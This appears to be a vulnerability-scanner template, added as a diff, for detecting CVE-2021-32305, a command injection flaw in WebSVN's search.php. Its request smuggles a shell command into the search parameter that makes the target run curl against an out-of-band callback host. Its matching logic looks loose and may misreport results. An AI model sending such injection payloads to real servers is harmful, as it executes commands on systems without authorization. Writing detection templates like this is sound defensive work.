@@ -1,0 +1,44 @@
+id: websvn-search-rce-cve-2021-32305
+
+info:
+  name: WebSVN 2.6.0 search.php RCE (CVE-2021-32305)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WebSVN versions earlier than 2.6.1 have an arbitrary command execution vulnerability. An attacker can execute arbitrary commands through the search parameter to obtain server permissions.
+  reference:
+    - https://github.com/websvnphp/websvn
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202105-1210
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+    cve-id: CVE-2021-32305
+  tags:
+    - rce
+    - command-execution
+    - critical
+
+http:
+  - raw:
+      - |
+        GET /search.php?search=";curl {{interactsh-url}};" HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '.*<html.*'
+          - '.*<body.*'
+
+    extractors:
+      - type: regex
+        part: interactsh_protocol
+        regex:
+          - dns
+          - http
